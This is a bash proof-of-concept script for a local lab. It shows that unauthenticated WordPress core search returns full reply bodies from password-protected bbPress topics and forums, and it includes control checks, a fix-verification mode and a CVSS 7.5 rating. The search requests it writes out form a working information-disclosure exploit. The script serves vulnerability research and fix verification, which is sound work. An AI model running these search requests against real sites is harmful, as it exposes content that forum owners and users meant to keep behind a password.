#!/usr/bin/env bash
# PoC: unauthenticated WordPress search discloses reply bodies that belong to
# password-protected bbPress topics or forums.
#
# Local lab only. Run:
#   ./bin/password-reply-search-poc.sh
#   ./bin/password-reply-search-poc.sh --verify-fix
set -euo pipefail

LAB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
BASE_URL="${BASE_URL:-http://127.0.0.1:8899}"
PHP="$LAB_DIR/bin/php"
WPCLI="$LAB_DIR/bin/wp-cli.phar"
WP=( "$PHP" "$WPCLI" "--path=$LAB_DIR/wordpress" )
TMP="$(mktemp -d)"
VERIFY_FIX=0
[ "${1:-}" = "--verify-fix" ] && VERIFY_FIX=1

MU_DIR="$LAB_DIR/wordpress/wp-content/mu-plugins"
MU_FILE="$MU_DIR/bbp-password-inherit-proof.php"

cleanup() {
  rm -rf "$TMP"
  rm -f "$MU_FILE"
}
trap cleanup EXIT
rm -f "$MU_FILE"

wp() { "${WP[@]}" "$@"; }

json_field() {
  python3 -c 'import json,sys; print(json.load(open(sys.argv[1])).get(sys.argv[2], ""))' "$1" "$2"
}

search_body() {
  local term="$1" type="$2" out="$3"
  curl -sS --max-time 20 -o "$out" \
    --get --data-urlencode "s=$term" \
    --data-urlencode "post_type=$type" \
    "$BASE_URL/"
}

count_marker() {
  local marker="$1" file="$2"
  grep -c -- "$marker" "$file" 2>/dev/null || true
}

echo "== bbPress password reply disclosure PoC =="
echo "target: $BASE_URL"

if ! curl -sS --max-time 5 -o /dev/null "$BASE_URL/"; then
  "$LAB_DIR/bin/start-server.sh" >/dev/null
fi

MARK="poc$(date +%s)${RANDOM}"
FIXTURE="$TMP/fixture.json"
LEAK_MARK="$MARK" wp eval-file "$LAB_DIR/fixtures/password-reply-search.php" --user=admin > "$FIXTURE"

TOPIC_REPLY="$(json_field "$FIXTURE" topic_reply)"
FORUM_REPLY="$(json_field "$FIXTURE" forum_reply)"
PRIVATE_REPLY="$(json_field "$FIXTURE" private_reply)"
HIDDEN_REPLY="$(json_field "$FIXTURE" hidden_reply)"
TOPIC_REPLY_SLUG="$(wp post get "$TOPIC_REPLY" --field=post_name)"

echo "fixture mark: $MARK"
echo "protected-topic reply: #$TOPIC_REPLY ($TOPIC_REPLY_SLUG)"
echo "protected-forum reply: #$FORUM_REPLY"
echo

echo "-- control: direct reply page must not render the body --"
curl -sS --max-time 20 -o "$TMP/direct.html" "$BASE_URL/?reply=$TOPIC_REPLY_SLUG"
if [ "$(count_marker "REPLY_SECRET_$MARK" "$TMP/direct.html")" -eq 0 ]; then
  echo "  [ok] direct page hides the reply body"
else
  echo "  [unexpected] direct page rendered the reply body"
  exit 1
fi

echo "-- control: REST single reply must be denied --"
REST_CODE="$(curl -sS --max-time 20 -o "$TMP/rest.json" -w '%{http_code}' "$BASE_URL/?rest_route=/wp/v2/reply/$TOPIC_REPLY")"
if [ "$REST_CODE" = "401" ] || [ "$REST_CODE" = "403" ]; then
  echo "  [ok] REST single reply -> HTTP $REST_CODE"
else
  echo "  [unexpected] REST single reply -> HTTP $REST_CODE"
  exit 1
fi
echo

echo "-- vulnerable path: unauthenticated core search --"
search_body "REPLY_SECRET" "reply" "$TMP/search-topic.html"
search_body "FORUM_REPLY_SECRET" "reply" "$TMP/search-forum.html"

TOPIC_LEAK="$(count_marker "REPLY_SECRET_$MARK" "$TMP/search-topic.html")"
FORUM_LEAK="$(count_marker "FORUM_REPLY_SECRET_$MARK" "$TMP/search-forum.html")"

if [ "$TOPIC_LEAK" -gt 0 ]; then
  echo "  [VULNERABLE] password-protected topic: full reply body disclosed ($TOPIC_LEAK match)"
else
  echo "  [not vulnerable] password-protected topic: no body disclosed"
fi
if [ "$FORUM_LEAK" -gt 0 ]; then
  echo "  [VULNERABLE] password-protected forum: full reply body disclosed ($FORUM_LEAK match)"
else
  echo "  [not vulnerable] password-protected forum: no body disclosed"
fi

echo "-- controls: private and hidden replies stay excluded --"
search_body "PRIVATE_REPLY_SECRET" "reply" "$TMP/search-private.html"
search_body "HIDDEN_REPLY_SECRET" "reply" "$TMP/search-hidden.html"
PRIVATE_LEAK="$(count_marker "PRIVATE_REPLY_SECRET_$MARK" "$TMP/search-private.html")"
HIDDEN_LEAK="$(count_marker "HIDDEN_REPLY_SECRET_$MARK" "$TMP/search-hidden.html")"
echo "  private reply matches: $PRIVATE_LEAK (expected 0)"
echo "  hidden reply matches:  $HIDDEN_LEAK (expected 0)"
echo

if [ "$VERIFY_FIX" = "1" ]; then
  echo "-- verify root cause with the upstream password-inheritance filter --"
  mkdir -p "$MU_DIR"
  cp "$LAB_DIR/fixtures/password-inherit-proof.php" "$MU_FILE"
  sleep 1
  search_body "REPLY_SECRET" "reply" "$TMP/fixed-topic.html"
  search_body "FORUM_REPLY_SECRET" "reply" "$TMP/fixed-forum.html"
  FIXED_TOPIC="$(count_marker "REPLY_SECRET_$MARK" "$TMP/fixed-topic.html")"
  FIXED_FORUM="$(count_marker "FORUM_REPLY_SECRET_$MARK" "$TMP/fixed-forum.html")"
  echo "  after fix: topic reply matches=$FIXED_TOPIC, forum reply matches=$FIXED_FORUM (expected 0/0)"
  rm -f "$MU_FILE"
  [ "$FIXED_TOPIC" -eq 0 ] && [ "$FIXED_FORUM" -eq 0 ] || exit 1
fi

if [ "$TOPIC_LEAK" -eq 0 ] && [ "$FORUM_LEAK" -eq 0 ]; then
  echo "RESULT: not vulnerable (unexpected for this checkout)"
  exit 1
fi

cat <<'EOF'

RESULT: VULNERABLE
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 (High)
Impact: an unauthenticated visitor can read full reply bodies from
password-protected bbPress topics/forums through core search results.
EOF
